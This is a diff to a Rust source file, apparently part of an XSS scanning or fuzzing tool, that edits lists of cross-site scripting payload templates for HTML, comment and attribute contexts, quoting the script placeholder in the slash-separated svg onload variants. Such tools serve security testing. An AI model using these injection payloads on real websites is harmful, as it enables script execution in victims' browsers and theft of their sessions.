@@ -123,7 +123,7 @@ impl<'a> FilterProfile<'a> {
 const HTML_TEMPLATES: &[&str] = &[
     "<svg onload={JS} class={CLASS}>",
     "<img src=x onerror={JS} class={CLASS}>",
-    "<svg/onload={JS}/class={CLASS}>",
+    "<svg/onload=\"{JS}\"/class={CLASS}>",
     "<details open ontoggle={JS} class={CLASS}>",
     "<svg onload={JS} id={ID}>",
     "<img src=x onerror={JS} id={ID}>",
@@ -142,7 +142,7 @@ const HTML_COMMENT_TEMPLATES: &[&str] = &[
     "--><svg onload={JS} class={CLASS}>",
     "--><img src=x onerror={JS} class={CLASS}>",
     "--!><svg onload={JS} class={CLASS}>",
-    "--><svg/onload={JS}/class={CLASS}>",
+    "--><svg/onload=\"{JS}\"/class={CLASS}>",
 ];
 
 /// Single-quoted attribute value. The "stay-in-tag" event-injection shapes need
@@ -187,7 +187,7 @@ const ATTR_SQ_TEMPLATES: &[&str] = &[
     "'/autofocus/onfocus=\"{JS}\"/id=\"{ID}\"/x='",
     "'><svg onload={JS} class={CLASS}>",
     "'><img src=x onerror={JS} class={CLASS}>",
-    "'><svg/onload={JS}/class={CLASS}>",
+    "'><svg/onload=\"{JS}\"/class={CLASS}>",
     "'><svg onload={JS} id={ID}>",
 ];
 
@@ -210,7 +210,7 @@ const ATTR_DQ_TEMPLATES: &[&str] = &[
     "\"/autofocus/onfocus='{JS}'/id='{ID}'/x=\"",
     "\"><svg onload={JS} class={CLASS}>",
     "\"><img src=x onerror={JS} class={CLASS}>",
-    "\"><svg/onload={JS}/class={CLASS}>",
+    "\"><svg/onload=\"{JS}\"/class={CLASS}>",
     "\"><svg onload={JS} id={ID}>",
 ];
 
@@ -233,7 +233,7 @@ const ATTR_UNQUOTED_TEMPLATES: &[&str] = &[
     //    stay-in-tag slash injection cannot work there — close the tag with `>`
     //    and open a fresh, self-contained `<svg>` whose parts are `/`-separated.
     //    Needs angles allowed.
-    "><svg/onload={JS}/id={ID}>",
+    "><svg/onload=\"{JS}\"/id={ID}>",
     // 2. A leading `x` plus self-quoted inner values, for the common case where
     //    the delimiter was reported as unknown but the reflection is actually a
     //    *quoted* value (`value="…"`) — including partial-encoding filters that
